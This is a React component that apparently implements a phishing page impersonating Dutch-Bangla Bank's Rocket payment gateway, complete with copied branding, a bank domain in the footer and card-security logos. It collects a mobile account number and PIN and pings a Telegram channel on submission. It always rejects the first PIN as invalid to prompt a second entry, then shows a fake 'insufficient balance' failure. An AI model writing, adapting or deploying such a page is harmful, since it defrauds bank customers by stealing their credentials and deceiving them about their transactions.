import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";

const RocketPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [mobileAccount, setMobileAccount] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pinAttempts, setPinAttempts] = useState(0);
  const [showError, setShowError] = useState("");
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [showFailed, setShowFailed] = useState(false);

  const mobileRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);

  const descriptionId = "6121177461315994416";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  useEffect(() => {
    setTimeout(() => mobileRef.current?.focus(), 100);
  }, []);

  useEffect(() => {
    if (showFailed && redirectTimer > 0) {
      const interval = setInterval(() => setRedirectTimer(p => p - 1), 1000);
      return () => clearInterval(interval);
    }
    if (showFailed && redirectTimer === 0) {
      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
    }
  }, [showFailed, redirectTimer, navigate]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileAccount.length === 11 && validPrefixes.includes(mobileAccount.substring(0, 3)) && /^\d+$/.test(mobileAccount);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
    setMobileAccount(value);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 5);
    setPin(value);
  };

  const handleSubmit = () => {
    if (!isValidMobile()) {
      setShowError("Please enter a valid mobile number.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }

    setIsSubmitting(true);
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });

    if (pinAttempts === 0) {
      setTimeout(() => {
        setIsSubmitting(false);
        setPinAttempts(1);
        setShowError("Invalid PIN. Please try again.");
        setPin("");
        setTimeout(() => pinRef.current?.focus(), 50);
        setTimeout(() => setShowError(""), 4000);
      }, 2000);
      return;
    }

    setTimeout(() => {
      setIsSubmitting(false);
      setShowFailed(true);
      setRedirectTimer(5);
    }, 2000);
  };

  const handleBack = () => {
    navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}.00`);
  };

  const handleReset = () => {
    setMobileAccount("");
    setPin("");
    setShowError("");
    setTimeout(() => mobileRef.current?.focus(), 50);
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  if (showFailed) {
    return (
      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-4">
        <div className="w-full max-w-[700px] bg-white">
          {/* Header */}
          <div className="flex items-center justify-center py-3 bg-white border-b-2 border-[#f0f0f0]">
            <div className="flex items-center gap-3">
              <div className="flex items-center">
                <svg width="40" height="40" viewBox="0 0 60 60" fill="none">
                  <circle cx="20" cy="30" r="12" fill="#003399"/>
                  <circle cx="30" cy="30" r="12" fill="#CC0000"/>
                  <circle cx="40" cy="30" r="12" fill="#009933"/>
                </svg>
              </div>
              <div>
                <span className="text-2xl font-bold text-[#003366]" style={{fontFamily: 'Georgia, serif'}}>Dutch-Bangla Bank</span>
                <div className="text-xs text-[#666] tracking-[0.15em] uppercase" style={{fontFamily: 'Georgia, serif'}}>Your Trusted Partner</div>
              </div>
            </div>
          </div>

          {/* Blue bar */}
          <div className="bg-gradient-to-r from-[#0066cc] to-[#0099ff] py-2 text-center">
            <span className="text-white text-lg font-bold tracking-wider" style={{fontFamily: 'Georgia, serif'}}>DBBL NEXUS GATEWAY</span>
          </div>
          <div className="h-1 bg-gradient-to-r from-[#0044aa] to-[#0077dd]"></div>

          <div className="p-8 text-center">
            <p className="text-red-600 font-bold text-lg mb-2">Transaction Failed</p>
            <p className="text-gray-600 mb-2">Insufficient balance in your account.</p>
            <p className="text-gray-500 text-sm">
              Redirecting to merchant website in {redirectTimer}s...
            </p>
          </div>

          {/* Footer */}
          <div className="mt-4">
            <div className="h-1 bg-gradient-to-r from-[#0044aa] to-[#0077dd]"></div>
            <div className="text-center py-3">
              <p className="text-sm font-bold text-[#333]">DBBL E-COMM With Service Hub Limited</p>
              <p className="text-xs text-[#666]">ecom1.dutchbanglabank.com</p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-4">
      <div className="w-full max-w-[700px] bg-white">
        {/* Bank Header */}
        <div className="flex items-center justify-center py-3 bg-white border-b-2 border-[#f0f0f0]">
          <div className="flex items-center gap-3">
            <div className="flex items-center">
              <svg width="40" height="40" viewBox="0 0 60 60" fill="none">
                <circle cx="20" cy="30" r="12" fill="#003399"/>
                <circle cx="30" cy="30" r="12" fill="#CC0000"/>
                <circle cx="40" cy="30" r="12" fill="#009933"/>
              </svg>
            </div>
            <div>
              <span className="text-2xl font-bold text-[#003366]" style={{fontFamily: 'Georgia, serif'}}>Dutch-Bangla Bank</span>
              <div className="text-xs text-[#666] tracking-[0.15em] uppercase" style={{fontFamily: 'Georgia, serif'}}>Your Trusted Partner</div>
            </div>
          </div>
        </div>

        {/* Blue Title Bar */}
        <div className="bg-gradient-to-r from-[#0066cc] to-[#0099ff] py-2 text-center">
          <span className="text-white text-lg font-bold tracking-wider" style={{fontFamily: 'Georgia, serif'}}>DBBL NEXUS GATEWAY</span>
        </div>
        <div className="h-1 bg-gradient-to-r from-[#0044aa] to-[#0077dd]"></div>

        {/* Form Section */}
        <div className="px-6 py-6">
          <h2 className="text-center font-bold text-base text-[#333] mb-6" style={{fontFamily: 'Arial, sans-serif'}}>
            Mobile Account Information
          </h2>

          {showError && (
            <div className="text-center text-red-600 text-sm mb-3 font-medium">
              {showError}
            </div>
          )}

          {/* Form Table */}
          <div className="max-w-md mx-auto space-y-3">
            {/* Mobile Account */}
            <div className="flex items-center justify-end gap-3">
              <label className="text-sm font-bold text-[#333] whitespace-nowrap" style={{fontFamily: 'Arial, sans-serif'}}>
                Mobile Account
              </label>
              <input
                ref={mobileRef}
                type="text"
                inputMode="numeric"
                value={mobileAccount}
                onChange={handleMobileChange}
                className="border border-[#999] px-2 py-1 text-sm w-[200px] focus:outline-none focus:border-[#0066cc]"
                style={{fontFamily: 'Arial, sans-serif'}}
              />
            </div>

            {/* PIN */}
            <div className="flex items-center justify-end gap-3">
              <label className="text-sm font-bold text-[#333] whitespace-nowrap" style={{fontFamily: 'Arial, sans-serif'}}>
                PIN
              </label>
              <div className="flex items-center gap-1">
                <input
                  ref={pinRef}
                  type={showPin ? "text" : "password"}
                  inputMode="numeric"
                  value={pin}
                  onChange={handlePinChange}
                  className="border border-[#999] px-2 py-1 text-sm w-[100px] focus:outline-none focus:border-[#0066cc]"
                  style={{fontFamily: 'Arial, sans-serif'}}
                />
                <button
                  onClick={togglePinVisibility}
                  className="w-[36px] h-[28px] border border-[#999] bg-[#f5f5f5] flex items-center justify-center"
                  title={showPin ? "Hide PIN" : "Show PIN"}
                >
                  <svg width="16" height="12" viewBox="0 0 20 14" fill="none">
                    <rect x="1" y="1" width="18" height="12" rx="1" stroke="#666" strokeWidth="1" fill="#ddd"/>
                    <line x1="3" y1="4" x2="5" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="6" y1="4" x2="8" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="9" y1="4" x2="11" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="12" y1="4" x2="14" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="15" y1="4" x2="17" y2="4" stroke="#888" strokeWidth="1"/>
                    <line x1="3" y1="7" x2="5" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="6" y1="7" x2="8" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="9" y1="7" x2="11" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="12" y1="7" x2="14" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="15" y1="7" x2="17" y2="7" stroke="#888" strokeWidth="1"/>
                    <line x1="3" y1="10" x2="5" y2="10" stroke="#888" strokeWidth="1"/>
                    <line x1="6" y1="10" x2="8" y2="10" stroke="#888" strokeWidth="1"/>
                    <line x1="9" y1="10" x2="11" y2="10" stroke="#888" strokeWidth="1"/>
                  </svg>
                </button>
              </div>
            </div>

            {/* Amount */}
            <div className="flex items-center justify-center gap-2 pt-1">
              <span className="text-sm font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>Amount</span>
              <span className="text-sm text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>{amount}.00</span>
            </div>

            {/* Currency */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-sm font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>Currency</span>
              <span className="text-sm text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>BDT</span>
            </div>

            {/* Description */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-sm font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>Description</span>
              <span className="text-sm text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>{descriptionId}</span>
            </div>
          </div>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-2 mt-8">
            <button
              onClick={handleBack}
              className="px-1"
            >
              <img 
                src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e8e8e8'/%3E%3Cstop offset='100%25' stop-color='%23b0b0b0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='90' height='28' rx='3' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='28' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='28' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='28' fill='%23003399'/%3E%3Crect x='81' y='0' width='2' height='28' fill='%23003399'/%3E%3Crect x='83' y='0' width='2' height='28' fill='%23009933'/%3E%3Crect x='85' y='0' width='2' height='28' fill='%23cc0000'/%3E%3Ctext x='45' y='18' text-anchor='middle' font-family='Arial' font-size='13' font-weight='bold' fill='%23333'%3EBACK%3C/text%3E%3C/svg%3E"
                alt="BACK"
                className="h-7 cursor-pointer hover:opacity-80"
              />
            </button>
            <button
              onClick={handleSubmit}
              disabled={isSubmitting}
              className="px-1"
            >
              <img 
                src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e8e8e8'/%3E%3Cstop offset='100%25' stop-color='%23b0b0b0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='90' height='28' rx='3' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='28' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='28' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='28' fill='%23003399'/%3E%3Crect x='81' y='0' width='2' height='28' fill='%23003399'/%3E%3Crect x='83' y='0' width='2' height='28' fill='%23009933'/%3E%3Crect x='85' y='0' width='2' height='28' fill='%23cc0000'/%3E%3Ctext x='45' y='18' text-anchor='middle' font-family='Arial' font-size='13' font-weight='bold' fill='%23333'%3ESUBMIT%3C/text%3E%3C/svg%3E"
                alt="SUBMIT"
                className="h-7 cursor-pointer hover:opacity-80"
              />
            </button>
            <button
              onClick={handleReset}
              className="px-1"
            >
              <img 
                src="data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e8e8e8'/%3E%3Cstop offset='100%25' stop-color='%23b0b0b0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='90' height='28' rx='3' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='3' y='0' width='2' height='28' fill='%23cc0000'/%3E%3Crect x='5' y='0' width='2' height='28' fill='%23009933'/%3E%3Crect x='7' y='0' width='2' height='28' fill='%23003399'/%3E%3Crect x='81' y='0' width='2' height='28' fill='%23003399'/%3E%3Crect x='83' y='0' width='2' height='28' fill='%23009933'/%3E%3Crect x='85' y='0' width='2' height='28' fill='%23cc0000'/%3E%3Ctext x='45' y='18' text-anchor='middle' font-family='Arial' font-size='13' font-weight='bold' fill='%23333'%3ERESET%3C/text%3E%3C/svg%3E"
                alt="RESET"
                className="h-7 cursor-pointer hover:opacity-80"
              />
            </button>
          </div>

          {/* Verified logos */}
          <div className="flex items-center justify-center gap-4 mt-8">
            <div className="flex flex-col items-center">
              <span className="text-[#003399] text-lg font-bold italic leading-none" style={{fontFamily: 'Georgia, serif'}}>V</span>
              <span className="text-[#003399] text-[10px] font-bold italic leading-none" style={{fontFamily: 'Georgia, serif'}}>ERIFIED</span>
              <span className="text-[#cc6600] text-[9px] font-bold leading-none" style={{fontFamily: 'Arial, sans-serif'}}>by <span className="text-[#003399] italic" style={{fontFamily: 'Georgia, serif'}}>VISA</span></span>
            </div>
            <div className="flex flex-col items-center">
              <span className="text-[#cc0000] text-sm font-bold leading-none" style={{fontFamily: 'Arial, sans-serif'}}>MasterCard</span>
              <span className="text-[#cc0000] text-[9px] font-bold italic leading-none" style={{fontFamily: 'Georgia, serif'}}>SecureCode.</span>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-4">
          <div className="h-1 bg-gradient-to-r from-[#0044aa] to-[#0077dd]"></div>
          <div className="text-center py-3">
            <p className="text-sm font-bold text-[#333]" style={{fontFamily: 'Arial, sans-serif'}}>DBBL E-COMM With Service Hub Limited</p>
            <p className="text-xs text-[#666]" style={{fontFamily: 'Arial, sans-serif'}}>ecom1.dutchbanglabank.com</p>
          </div>
        </div>
      </div>

      {/* Loading overlay */}
      {isSubmitting && (
        <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
          <div className="text-center">
            <div className="w-8 h-8 border-3 border-[#0066cc] border-t-transparent rounded-full animate-spin mx-auto mb-2"></div>
            <p className="text-sm text-[#333]">Processing...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default RocketPayment;
